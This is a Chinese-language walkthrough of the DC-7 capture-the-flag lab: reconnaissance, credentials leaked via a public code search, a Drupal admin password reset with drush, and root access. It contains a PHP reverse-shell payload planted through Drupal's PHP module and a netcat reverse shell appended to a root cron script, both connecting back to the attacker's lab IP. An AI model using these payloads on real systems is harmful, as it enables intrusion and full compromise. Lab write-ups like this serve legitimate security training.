## 环境安装:

kali 和 DC-7 都为NAT模式 保证在同一个网段下 可以相互连通。

![image-20220325195009768](https://image.3001.net/images/20220325/1648214859_623dc34beaf9e9f5439e4.png!small)

## 信息收集

    
    
    arp-scan -l     #扫描指定网卡下面的全部IP。

![image-20220325195409805](https://image.3001.net/images/20220325/1648214860_623dc34cef96f1cd75f9f.png!small)

> 通过扫描可以判断DC-7的IP为 192.168.79.132。
    
    
    nmap -p 1-65535 192.168.79.132  #扫描全部端口探测开启的服务。

![image-20220325195710245](https://image.3001.net/images/20220325/1648214861_623dc34de92eec51cb009.png!small)

> 可以清楚的看到，DC-7开启了 22 和 80端口。

> 浏览器访问80端口的http服务 <http://192.168.79.132>。

![image-20220325195933647](https://image.3001.net/images/20220325/1648214862_623dc34ed386cb1a69a34.png!small)

> 得到非常奇怪的提示 叫我们不需要暴力破解啥的。
>
> 我就不信邪，我就暴力刷目录，暴力破解后台账号密码，破解邮箱。然后一无所获。

![image-20220325200212152](https://image.3001.net/images/20220325/1648214864_623dc35023f17d1f7cac5.png!small)

![image-20220325200226809](https://image.3001.net/images/20220325/1648214865_623dc351076385d8b6356.png!small)

> 也找了一些Drupal 8 的漏洞 但是好像都不符合。

![image-20220325200312829](https://image.3001.net/images/20220325/1648214865_623dc351f387b76f277eb.png!small)

> 最后看来其他人的wp才知道秘密在这里。

![image-20220325200347485](https://image.3001.net/images/20220325/1648214866_623dc352d26b28f0c27fe.png!small)

> 这个靶场属于git源码泄露。
>
> 直接google 搜索 @DC7USER。

![image-20220325200710142](https://image.3001.net/images/20220325/1648214867_623dc353b9fe1aeb002ae.png!small)

> 东西不就来了么。

![image-20220325200733172](https://image.3001.net/images/20220325/1648214868_623dc354cde2aa8f10722.png!small)

![image-20220325200958944](https://image.3001.net/images/20220325/1648214869_623dc355dd7c53416f309.png!small)

> 一个一个找过去 可以看到。

![image-20220325201027874](https://image.3001.net/images/20220325/1648214871_623dc3571f19b442b1bef.png!small)

![image-20220325201041628](https://image.3001.net/images/20220325/1648214872_623dc35807cad8be01e1f.png!small)

> 里面记录了数据库账号密码 尝试后台登录发现不行。
>
> 但是可以登录ssh 有点邪门。

![image-20220325201643634](https://image.3001.net/images/20220325/1648214874_623dc35a492905a2bf4a2.png!small)

## 获取后台账号密码

    
    
    ls          #发现一个mbox文件 进去看看。  
    cat mbox

![image-20220325202004276](https://image.3001.net/images/20220325/1648214875_623dc35b45971d4f04bfb.png!small)

> 发现里面有一个定时任务 用root 运行/opt/scripts/backups.sh。

![image-20220325203802823.png](https://image.3001.net/images/20220325/1648214876_623dc35c446863056e3d4.png!small)

> 查看下权限什么的，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。
>
> 但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那么我们可以获得了root权限的shell了。

> 查看下 /opt/scripts/backups.sh 内容。

![image-20220325202409637](https://image.3001.net/images/20220325/1648214877_623dc35d39cb4015089f1.png!small)

> 可以看到命令是进入 cd /var/www/html/ 后执行drush。
>
> 然后去百度看看 drush是干什么呢？
>
> Drush(Drush = Drupal + Shell)就是使用命令行命令来操作Drupal站点，它的命令格式与git类似，都是双字命令（drush
> +
> 实际的命令）。既然是命令行命令，也就可以使用其他脚本来实现相同的功能，比如编写shell脚本来实现相同的功能，也的确有不少人这样做过。但是，使用Drush要远优于编写自己的脚本，好处在于，一是可以利用Drush开发社区的力量，二是Drush的命令更加可靠，适用于更多变的环境。
>
> <https://www.howtoing.com/a-beginner-s-guide-to-drush-the-drupal-shell>
>
> 这里有写一些drush基本语法。
    
    
    drush user-password admin --password="new_pass"   
    #想要更改您的密码？就这么简单。  
    #记得执行命令前先切换到Drupal的目录下面。  
    cd /var/www/html/  
    #Drupal默认账户是admin  123456为我修改的密码。  
    drush user-password admin --password="123456" 

![image-20220325203434674](https://image.3001.net/images/20220325/1648214878_623dc35e607242a69ba83.png!small)

> 这样子就修改成功了。
>
> 去后台登录下。

## 获得www-data的shell

登录后台。

![image-20220325204319506](https://image.3001.net/images/20220325/1648214879_623dc35f5582f0d627589.png!small)

![image-20220325204330422](https://image.3001.net/images/20220325/1648214880_623dc3603aa520d821dc4.png!small)

> 进入到后台管理页面 然后就找写webshell的地方了。

![image-20220325204426158](https://image.3001.net/images/20220325/1648214881_623dc3611f8d4146e1b8e.png!small)

> 发现Content里面可以编辑文章。

![image-20220325204509023](https://image.3001.net/images/20220325/1648214882_623dc362224bf3e6dacf6.png!small)

> 但是没办法用php执行，只可以用HTML执行 然后继续瞎点。

![image-20220325204700436](https://image.3001.net/images/20220325/1648214883_623dc36308f3658493011.png!small)

> 发现Extend里面可以安装新模块 试试可不可以安装php。
    
    
    php 插件下载地址  
    https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz

![image-20220325205015689](https://image.3001.net/images/20220325/1648214884_623dc36407d6b0f203629.png!small)

> 直接安装即可。

![image-20220325205034579](https://image.3001.net/images/20220325/1648214884_623dc364ee574e0c1beaa.png!small)

> 安装完成后当然要使用起来。

![image-20220325205142935](https://image.3001.net/images/20220325/1648214885_623dc365e4a3fcc629429.png!small)

![image-20220325205149002](https://image.3001.net/images/20220325/1648214886_623dc366c308c6a0cc031.png!small)

> 回到刚刚的文章编辑的地方。

![image-20220325205238948](https://image.3001.net/images/20220325/1648214887_623dc36793355826af217.png!small)

> 可以看到多了一个PHP解释器。

> 写入一个php 反弹shell的脚步。
    
    
    <?php  
    $sock = fsockopen("192.168.79.128", "5555");  
    $descriptorspec = array(  
    0 => $sock,  
    1 => $sock,  
    2 => $sock  
    );  
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);  
    proc_close($process);?>

![image-20220325205351685](https://image.3001.net/images/20220325/1648214888_623dc368946529d7e94be.png!small)

> 保存即可.
    
    
    #记得开启nc侦听。  
    nc -lvvp 5555

![image-20220325205523935](https://image.3001.net/images/20220325/1648214889_623dc369bbecc23b85acc.png!small)

> 重新访问主网页就可以了。

![image-20220325205615344](https://image.3001.net/images/20220325/1648214890_623dc36aaeb4e2a1aa233.png!small)

> 成功反弹shell。
    
    
    python -c "import pty;pty.spawn('/bin/bash')"  
    #利用python 弄个交互页面

![image-20220325205724908](https://image.3001.net/images/20220325/1648214891_623dc36bb87d9784a6222.png!small)

## 提权

    
    
    #向  
    /opt/scripts/backups.sh  
    #内写入反弹shell的脚本  
    #用bash nc都可以 我这里用的是nc  
    echo "nc 192.168.79.128 12345 -e /bin/bash" >> /opt/scripts/backups.sh  
    # 记得kali也要开启侦听  
    nc -lvvp 12345

![image-20220325210204624](https://image.3001.net/images/20220325/1648214892_623dc36cd92aa39f1a66d.png!small)

![image-20220325210213640](https://image.3001.net/images/20220325/1648214893_623dc36dbe886c1677ac1.png!small)

> 要等比较久 要等他计划任务执行 ，这段时间可以去吃个饭什么的
>
> 我等了好久 好像都不行 然后我就把我DC-7重启了 就可以了
>
> 我等了一年了！！！

![image-20220325211637052](https://image.3001.net/images/20220325/1648214894_623dc36e8df67b4c6c95d.png!small)

## 获得FLAG

  

